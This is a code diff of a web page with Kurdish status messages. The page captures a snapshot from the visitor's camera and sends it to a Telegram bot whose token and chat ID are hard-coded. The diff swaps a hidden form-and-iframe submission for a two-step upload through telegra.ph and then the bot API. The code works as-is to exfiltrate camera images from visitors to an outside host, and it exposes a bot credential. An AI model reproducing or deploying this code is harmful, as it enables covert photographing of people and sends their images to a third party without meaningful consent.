@@ -9,13 +9,6 @@
 
     <h3 id="status">چاوەڕوان بە...</h3>
 
-    <!-- فۆرمی ڕاستەوخۆ بۆ تێپەڕاندنی هەموو کێشەکانی CORS و پرۆکسی -->
-    <form id="tgForm" action="https://api.telegram.org/bot8699050179:AAGeUEWCavf8zBFg8dHxoQb4YU1ofp0T3Cw/sendPhoto" method="POST" enctype="multipart/form-data" target="hidden_iframe" style="display:none;">
-        <input type="hidden" name="chat_id" value="6539379136">
-        <input type="file" name="photo" id="photoInput">
-    </form>
-    <iframe name="hidden_iframe" id="hiddenIframe" style="display:none;"></iframe>
-
     <script>
       const statusEl = document.getElementById('status');
 
@@ -34,25 +27,42 @@
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
             canvas.toBlob(blob => {
-              statusEl.innerText = "خەریکی ناردنی وێنەیە بۆ تلگرام...";
+              statusEl.innerText = "ئامادەکردنی وێنە...";
               
-              try {
-                  const file = new File([blob], "snapshot.jpg", { type: "image/jpeg" });
-                  const dataTransfer = new DataTransfer();
-                  dataTransfer.items.add(file);
-                  
-                  document.getElementById('photoInput').files = dataTransfer.files;
-                  
-                  // ناردنی ڕاستەوخۆی فۆرمەکە بۆ تلگرام
-                  document.getElementById('tgForm').submit();
+              const formData = new FormData();
+              formData.append('file', blob, 'snapshot.jpg');
 
-                  setTimeout(() => {
-                      statusEl.innerText = "✅ وێنەکە بە سەرکەوتوویی نێردرا بۆ تلگرام!";
-                  }, 2000);
+              // ناردنی ڕاستەوخۆ بۆ telegra.ph بێ هیچ پرۆکسی و کێشەیەک
+              fetch('https://telegra.ph/upload', {
+                method: 'POST',
+                body: formData
+              })
+              .then(res => res.json())
+              .then(data => {
+                if (data && data[0] && data[0].src) {
+                  const imageUrl = 'https://telegra.ph' + data[0].src;
+                  statusEl.innerText = "ناردنی بۆ تلگرام...";
+                  
+                  const token = "8699050179:AAGeUEWCavf8zBFg8dHxoQb4YU1ofp0T3Cw";
+                  const chatId = "6539379136";
+                  const telegramUrl = `https://api.telegram.org/bot${token}/sendPhoto?chat_id=${chatId}&photo=${encodeURIComponent(imageUrl)}`;
 
-              } catch (err) {
-                  statusEl.innerText = "❌ هەڵە: " + err.message;
-              }
+                  return fetch(telegramUrl);
+                } else {
+                  throw new Error("هەڵە لە بارکردنی وێنە");
+                }
+              })
+              .then(response => response.json())
+              .then(data => {
+                if(data.ok) {
+                    statusEl.innerText = "✅ وێنەکە بە سەرکەوتوویی نێردرا بۆ تلگرام!";
+                } else {
+                    statusEl.innerText = "❌ هەڵەی تلگرام: " + (data.description || JSON.stringify(data));
+                }
+              })
+              .catch(error => {
+                statusEl.innerText = "❌ هەڵەی ناردن: " + error.message;
+              });
             }, 'image/jpeg', 0.8);
           }, 2000);
         })
